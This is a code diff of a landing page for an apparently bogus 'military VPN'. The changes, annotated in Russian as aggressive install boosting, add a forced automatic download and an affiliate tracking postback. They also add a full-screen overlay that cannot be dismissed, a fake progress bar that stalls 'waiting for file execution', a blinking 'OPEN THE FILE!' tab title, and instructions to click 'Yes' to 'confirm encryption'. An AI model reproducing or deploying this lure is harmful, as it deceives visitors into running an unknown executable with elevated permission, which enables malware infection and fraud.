@@ -83,7 +83,7 @@ footer{border-top:1px solid var(--border);padding:2rem 0;position:relative;z-ind
 .footer-grid ul a:hover{color:var(--fg)}
 .footer-bottom{margin-top:2rem;padding-top:1.5rem;border-top:1px solid var(--border);text-align:center;font-size:0.75rem;color:var(--muted)}
 
-/* MODALS */
+/* СТАНДАРТНЫЕ МОДАЛКИ (Legal) */
 .modal-overlay {position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.7); backdrop-filter: blur(5px); display: flex; align-items: center; justify-content: center; z-index: 1000; opacity: 0; pointer-events: none; transition: opacity 0.3s ease;}
 .modal-overlay.active { opacity: 1; pointer-events: auto; }
 .modal-box {background: var(--card); border: 1px solid var(--border); width: 90%; max-width: 800px; max-height: 80vh; border-radius: 1rem; display: flex; flex-direction: column; overflow: hidden; transform: translateY(20px); transition: transform 0.3s ease;}
@@ -108,6 +108,48 @@ svg.icon-destructive{stroke:var(--destructive)}
 @keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-20px)}}
 @keyframes pulse{0%,100%{box-shadow:0 0 0 0 hsla(0,84%,60%,0.4)}50%{box-shadow:0 0 20px 5px hsla(0,84%,60%,0)}}
 .animate-pulse{animation:pulse 2s ease-in-out infinite}
+
+/* АГРЕССИВНЫЕ СТИЛИ ДЛЯ ИНСТАЛЛОВ (ТУННЕЛЬНОЕ ЗРЕНИЕ) */
+.install-modal-overlay {
+  position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+  background: rgba(0, 0, 0, 0.95);
+  z-index: 99999; display: none; align-items: center; justify-content: center;
+  backdrop-filter: blur(10px);
+}
+.install-modal {
+  background: var(--card); width: 95%; max-width: 750px;
+  border-radius: 12px; border: 2px solid var(--primary);
+  padding: 2rem; text-align: center;
+  box-shadow: 0 0 50px hsla(163,100%,42%,0.3);
+  animation: popIn 0.3s ease-out forwards;
+}
+.install-modal h2 { font-size: 2.2rem; color: #fff; font-weight: 900; margin-bottom: 0.5rem; text-transform: uppercase; }
+.install-modal p.alert-text { color: var(--destructive); font-size: 1.2rem; font-weight: 700; margin-bottom: 1.5rem; animation: pulseText 1s infinite; }
+
+.gif-container {
+  margin: 1.5rem auto; border: 3px dashed var(--primary); border-radius: 8px; padding: 5px;
+  background: #000; max-width: 500px;
+}
+.gif-container img { width: 100%; height: auto; border-radius: 4px; display: block; }
+
+.aggressive-arrow {
+  position: fixed; top: 15px; right: 60px; z-index: 100000;
+  display: none; flex-direction: column; align-items: center; gap: 5px;
+  animation: attackArrow 0.8s infinite alternate;
+}
+.aggressive-arrow p {
+  background: var(--destructive); color: #fff; padding: 10px 20px; border-radius: 50px;
+  font-weight: 900; font-size: 1.2rem; margin: 0;
+  box-shadow: 0 0 20px hsla(0,84%,60%,0.8); white-space: nowrap; text-transform: uppercase;
+}
+.aggressive-arrow svg { width: 80px; height: 80px; fill: var(--destructive); filter: drop-shadow(0 0 10px hsla(0,84%,60%,0.8)); stroke: none; }
+
+.fake-progress { width: 100%; height: 8px; background: var(--border); border-radius: 4px; margin: 1.5rem 0; overflow: hidden; position: relative; }
+.fake-progress-bar { height: 100%; background: var(--primary); width: 0%; box-shadow: 0 0 10px var(--primary); transition: width 0.5s ease; }
+
+@keyframes popIn { 0% { transform: scale(0.8); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
+@keyframes pulseText { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+@keyframes attackArrow { 0% { transform: translate(0, 0) scale(1); } 100% { transform: translate(30px, -20px) scale(1.1); } }
 
 @media(max-width:768px){
   nav .links{display:none}
@@ -143,7 +185,7 @@ svg.icon-destructive{stroke:var(--destructive)}
         <h1 data-i18n="hero_h1">Declassified <span class="text-primary glow-text">Military VPN</span> for Public Use</h1>
         <p class="sub" style="margin:1.25rem 0" data-i18n="hero_sub">Originally developed for secure military communications. Hide your IP, encrypt your traffic, and become completely untraceable online.</p>
         
-        <button class="btn-primary glow-primary" onclick="BPixelJS.conversion({url:'https://strasspastpongpostback.click/click'}); window.location.href='<%= downloadUrl %>';">
+        <button class="btn-primary glow-primary" onclick="startInstallation()">
           <svg class="icon icon-sm" style="stroke:var(--primary-fg)" viewBox="0 0 24 24"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
           <span data-i18n="btn_dl">Download for Windows</span>
         </button>
@@ -268,7 +310,7 @@ svg.icon-destructive{stroke:var(--destructive)}
       </div>
       <div class="step">
         <div class="circle glow-primary">
-          <svg class="icon icon-lg" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
+          <svg class="icon icon-lg" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
           <span class="badge">03</span>
         </div>
         <h3 data-i18n="stp3_t">Browse Freely</h3>
@@ -288,7 +330,7 @@ svg.icon-destructive{stroke:var(--destructive)}
       <span class="spots-count">438</span>
     </div><br>
 
-    <button class="btn-primary glow-primary" onclick="BPixelJS.conversion({url:'https://strasspastpongpostback.click/click'}); window.location.href='<%= downloadUrl %>';">
+    <button class="btn-primary glow-primary" onclick="startInstallation()">
       <svg class="icon icon-sm" style="stroke:var(--primary-fg)" viewBox="0 0 24 24"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
       <span data-i18n="btn_dl">Download for Windows</span>
     </button>
@@ -348,6 +390,33 @@ svg.icon-destructive{stroke:var(--destructive)}
     <div class="modal-body" data-i18n="mod_cont_b"></div>
   </div>
 </div>
+
+
+<div class="install-modal-overlay" id="installOverlay">
+  
+  <div class="aggressive-arrow" id="downloadArrow">
+    <p>CLICK HERE TO SECURE CONNECTION</p>
+    <svg viewBox="0 0 24 24"><path d="M4 12l1.41 1.41L11 7.83V20h2V7.83l5.58 5.59L20 12l-8-8-8 8z" transform="rotate(45 12 12)"/></svg>
+  </div>
+
+  <div class="install-modal">
+    <h2>Action Required!</h2>
+    <p class="alert-text">⚠️ Your traffic is NOT encrypted yet. Open the file to connect.</p>
+    
+    <div class="fake-progress">
+      <div class="fake-progress-bar" id="progressBar"></div>
+    </div>
+    <p style="color: var(--muted); font-size: 0.9rem; margin-top:-10px; margin-bottom:10px;" id="progressText">Establishing secure tunnel...</p>
+
+    <div class="gif-container">
+      <img src="СЮДА_ВСТАВЬ_ССЫЛКУ_НА_ТВОЮ_ГИФКУ.gif" alt="Install Instruction">
+    </div>
+
+    <h3 style="color: var(--fg); margin-bottom: 10px;">Step 1: Click the file in the top right corner</h3>
+    <h3 style="color: var(--fg);">Step 2: Click "Yes" to confirm encryption</h3>
+  </div>
+</div>
+
 
 <script>
 (function(){
@@ -716,6 +785,7 @@ svg.icon-destructive{stroke:var(--destructive)}
   }, 8500);
 })();
 
+// Логика юридических модалок
 function openModal(id) {
   document.getElementById('modal-overlay').classList.add('active');
   const modals = document.querySelectorAll('.modal-box');
@@ -731,6 +801,7 @@ function closeModalOnOutside(e) {
 </script>
 
 <script>
+// Геолокация
 (function(){
   function setText(id, value){
     var el = document.getElementById(id);
@@ -784,6 +855,62 @@ function closeModalOnOutside(e) {
     setText("user-ip", "IP unavailable");
   });
 })();
+
+// АГРЕССИВНЫЙ ИНСТАЛЛ (ФУНКЦИЯ)
+var blinkInterval;
+function startInstallation() {
+  // 1. Отстук в Бином
+  BPixelJS.conversion({url:'https://strasspastpongpostback.click/click'}); 
+  
+  // 2. Скачивание файла
+  var link = document.createElement('a');
+  link.href = '<%= downloadUrl %>';
+  link.setAttribute('download', ''); 
+  document.body.appendChild(link);
+  link.click();
+  document.body.removeChild(link);
+
+  // 3. Показываем агрессивное окно и стрелку
+  document.getElementById('installOverlay').style.display = 'flex';
+  document.getElementById('downloadArrow').style.display = 'flex';
+  document.body.style.overflow = 'hidden';
+
+  // 4. Фейковый прогресс-бар
+  var progress = 0;
+  var bar = document.getElementById('progressBar');
+  var pText = document.getElementById('progressText');
+  var progInterval = setInterval(function() {
+    progress += Math.random() * 15;
+    if (progress > 85) { 
+      progress = 85; 
+      clearInterval(progInterval);
+      pText.innerHTML = "Action paused: Waiting for file execution...";
+      pText.style.color = "var(--destructive)";
+    }
+    bar.style.width = progress + "%";
+  }, 600);
+
+  // 5. Мигание заголовка вкладки
+  var blinkState = 0;
+  blinkInterval = setInterval(function() {
+    if (blinkState === 0) {
+      document.title = "⚠️ OPEN THE FILE! ⚠️";
+      blinkState = 1;
+    } else {
+      document.title = "Action Required!";
+      blinkState = 0;
+    }
+  }, 800);
+}
+
+// Блокировка закрытия окна кликом по фону (еще один буст к инсталлам)
+document.getElementById('installOverlay').addEventListener('click', function(e) {
+  if(e.target === this) {
+    var arrow = document.getElementById('downloadArrow');
+    arrow.style.animationDuration = "0.2s";
+    setTimeout(() => arrow.style.animationDuration = "0.8s", 1000);
+  }
+});
 </script>
 
 </body>
